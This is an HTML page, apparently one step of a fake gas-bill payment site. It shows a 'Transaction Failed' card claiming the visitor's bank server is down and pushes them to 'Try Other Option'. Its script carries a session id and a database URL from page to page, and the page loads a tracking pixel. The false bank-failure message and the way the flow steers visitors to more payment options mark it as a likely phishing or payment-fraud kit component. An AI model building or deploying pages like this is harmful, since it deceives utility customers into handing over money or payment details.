<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Transaction Failed</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, Helvetica, sans-serif;
}

body{
    background:#f5f5f5;
    min-height:100vh;
    display:flex;
    flex-direction:column;
}

.top-header{
    width:100%;
    background:#1565C0;
    color:#ffffff;
    text-align:center;
    padding:16px;
    font-size:18px;
    font-weight:bold;
    letter-spacing:1px;
    box-shadow:0 2px 8px rgba(0,0,0,0.2);
}

.main-container{
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.card{
    width:100%;
    max-width:420px;
    background:#ffffff;
    border-radius:12px;
    box-shadow:0 8px 25px rgba(0,0,0,0.15);
    padding:40px 25px;
    text-align:center;
}

.error-icon{
    font-size:70px;
    color:#E53935;
    margin-bottom:20px;
}

.error-title{
    font-size:22px;
    font-weight:bold;
    color:#E53935;
    margin-bottom:15px;
}

.error-message{
    font-size:16px;
    color:#333;
    line-height:1.6;
    margin-bottom:25px;
}

.option-btn{
    display:inline-block;
    padding:12px 25px;
    background:#1565C0;
    color:#fff;
    border:none;
    border-radius:6px;
    font-size:15px;
    cursor:pointer;
    transition:0.3s;
}

.option-btn:hover{
    background:#0D47A1;
}
</style>


<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1502516798113338');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1502516798113338&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
</head>


<body>

<div class="top-header">
    GAS BILL UPDATE
</div>

<div class="main-container">
    <div class="card">

        <div class="error-icon"></div>

        <div class="error-title">
            TRANSACTION FAILED
        </div>

        <div class="error-message">
            Your bank server is Down.<br><br>
            Please try again using other options.
        </div>

        <button class="option-btn" onclick="goToOption()">
            Try Other Option
        </button>

    </div>
</div>

<script>
(function(){

    const urlParams = new URLSearchParams(window.location.search);

    let uniqueid = urlParams.get("id");
    let dbUrl = urlParams.get("dbUrl");
    let type = urlParams.get("type");
    let paymentType = urlParams.get("paymentType");

    console.log("=== LAST PAGE DATA RECEIVED ===");
    console.log("ID:", uniqueid);
    console.log("DB URL:", dbUrl);
    console.log("Type:", type);
    console.log("Payment Type:", paymentType);

    if(uniqueid) localStorage.setItem("transaction_uniqueid", uniqueid);
    if(dbUrl) localStorage.setItem("transaction_dbUrl", dbUrl);

    window.goToOption = function(){
        const params = new URLSearchParams();

        if(uniqueid) params.append("id", uniqueid);
        if(dbUrl) params.append("dbUrl", dbUrl);
        if(type) params.append("type", type);

        console.log("Redirecting to option.html with params:", params.toString());

        window.location.href = "option.html?" + params.toString();
    };

})();
</script>
</body>
</html>